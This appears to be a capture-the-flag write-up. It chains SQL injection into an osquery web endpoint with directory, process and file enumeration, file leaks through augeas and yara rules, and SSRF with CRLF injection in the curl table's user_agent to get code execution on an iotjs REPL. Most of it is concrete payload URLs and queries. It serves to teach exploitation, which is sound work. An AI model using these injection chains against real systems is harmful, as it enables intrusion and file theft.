## QQQueryyy_all_the_things
### SQL injection
```
http://8.218.140.54:12321/?str=world%27;select%20123;--
  -> SELECT 'world';select 123;--' as hello;
```
### Identify osquery
```
// ref: https://www.sqlite.org/schematab.html

http://8.218.140.54:12321/?str=world%27;select%20*%20from%20sqlite_temp_master;--
  -> select * from sqlite_temp_master;
```
Search these strange tables on google (eg. azure_instance_tags).
You will get `https://github.com/osquery/osquery/blob/master/specs/azure_instance_tags.table`.

### List directories
```
// ref: https://osquery.io/schema/5.0.1/

http://8.218.140.54:12321/?str=world%27;select%20*%20from%20file%20where%20directory=%22/%22;--
  -> select * from file where directory="/";
```
You will get `/flag` (0500; "u/gid":"0") and `/readflag` (4555; "u/gid":"0").
So we do not have permission to read `/flag`, we need a RCE!

### List services
```
// ref: https://osquery.io/schema/5.0.1/

http://8.218.140.54:12321/?str=world%27;select%20*%20from%20listening_ports;--
 -> select * from listening_ports;
```
We get `{"address":"0.0.0.0","family":"2","fd":"-1","net_namespace":"0","path":"","pid":"-1","port":"16324","protocol":"6","socket":"10554002"}`

```
http://8.218.140.54:12321/?str=world%27;select%20*%20from%20processes;--
 -> select * from processes; 
```
We get `{"cmdline":"/usr/sbin/xinetd -pidfile /run/xinetd.pid -stayalive -inetd_compat - ...`

```
http://8.218.140.54:12321/?str=world%27;select%20*%20from%20file%20where%20directory=%22/etc/xinetd.d/%22;--
 -> select * from file where directory="/etc/xinetd.d/";
```
We get `"directory":"/etc/xinetd.d/","filename":"ctf","gid":"0"`

### Read files
You could read config files directly.
```
http://8.218.140.54:12321/?str=world%27;select%20*%20from%20augeas%20where%20path=%22/etc/xinetd.d/ctf%22;--
  -> select * from augeas where path="/etc/xinetd.d/ctf";
```
You could use yara rules to leak arbitrary file contents.
```
select * from yara where path = '/etc/xinetd.d/ctf' and sigrule = 'rule rua { condition: uint8(1) < 0x70 }'
```
Anyway, you could get `/src/iotjs/build/x86_64-linux/debug/bin/iotjs /src/iotjs/tools/repl.js`.

https://github.com/jerryscript-project/iotjs

### Exploit iotjs
iotjs is started on port 16324.
You could get RCE through NAPI, write evil modules to /tmp/ and load it `require(xxx)`,
@SupperGuesser write "/proc/self/mem" to change the plt to get shell.

### SSRF
```
// ref: https://osquery.io/schema/5.0.1/
  -> select * from curl where url="http://127.0.0.1:16324/" and user_agent="\n\n\n\n\n\n\n\n\n\n\n{evil_js_code}\n\n\n\n\n\n\n\n\n\n\n";
```
Now, we could have a chance to interact with `port 16234(iotjs)`, however, we need to bypass this https://github.com/jerryscript-project/iotjs/blob/master/tools/repl.js#L39 trough crlf injection `"\n"*10` in user_agent.





